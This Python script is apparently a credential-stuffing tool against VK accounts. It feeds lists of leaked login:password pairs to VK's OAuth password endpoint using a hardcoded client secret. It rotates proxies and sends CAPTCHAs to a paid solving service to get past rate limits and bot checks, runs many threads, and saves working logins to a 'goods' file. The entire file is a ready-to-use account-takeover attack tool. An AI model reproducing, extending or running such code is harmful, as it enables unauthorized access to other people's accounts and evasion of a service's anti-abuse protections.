import logging
from base64 import b64encode, b64decode
from threading import Thread
from time import sleep

import requests
from twocaptcha import TwoCaptcha

from config import rucaptcha_key


def generator():
    for string in base:
        yield string


def get_proxy():
    if proxyes:
        proxy = proxyes.pop(0)
        proxyes.append(proxy)
        return proxy


def get_captcha_code(captcha_url):
    image = requests.get(captcha_url).content
    try:
        code = solver.normal(b64encode(image).decode("utf-8"))['code']
        logging.info("Каптча решена успешно")
        return code
    except Exception as error:
        print(error)
        logging.warning("Каптча не решена")


def check_respone(session, respone, login, password):
    if "error_type" in respone:
        logging.info(f"{login}:{password} - {respone['error_description']}")

    elif "captcha_img" in respone:
        logging.info("Капча")
        captcha_sid = respone['captcha_sid']
        captcha_url = respone['captcha_img']
        code = get_captcha_code(captcha_url=captcha_url)

        respone = session.get(f"{api_request}&username={login}&password={password}&captcha_sid={captcha_sid}&captcha_key={code}").json()

        check_respone(session, respone, login, password)

    elif "access_token" in respone:
        print(f"Найдено совпадение - {login}:{password}:{respone['access_token']}")
        goods.write(f"{login}:{password}")


def try_login(session, login, password):
    respone = session.get(f"{api_request}&username={login}&password={password}").json()

    check_respone(session, respone, login, password)


if __name__ == '__main__':
    api_request = "https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH"

    logging.basicConfig(
        filename='logs.log',
        filemode='a',
        format='%(asctime)s - %(message)s',
        datefmt='%d %b %H:%M:%S',
        level=logging.INFO
    )

    solver = TwoCaptcha(rucaptcha_key, pollingInterval=2)

    with open("base.txt") as file:
        base = file.read().split("\n")
        if "" in base:
            base.remove("")

    with open("proxy.txt") as file:
        proxyes = file.read().split("\n")
        if "" in proxyes:
            proxyes.remove("")

    goods = open("goods.txt", 'a')

    generator = generator()

    print(f"{b64decode('TWFrZWQgYnkgQFBjaG9sa2Vu').decode('utf8')}\n\n")

    countThreads = int(input("Колличество потоков => "))
    while True:
        try:
            for i in range(countThreads):
                logpass = next(generator)
                session = requests.session()

                proxy = get_proxy()
                if proxy:
                    session.proxies = {
                        "http": f"http://{proxy}",
                        "https": f"http://{proxy}"
                    }

                Thread(target=try_login, args=(session, *logpass.split(":"), )).start()
        except StopIteration:
            sleep(3)
            print("Все аккаунты прочеканы")
            input("Для выхода нажмите enter......")
            exit()
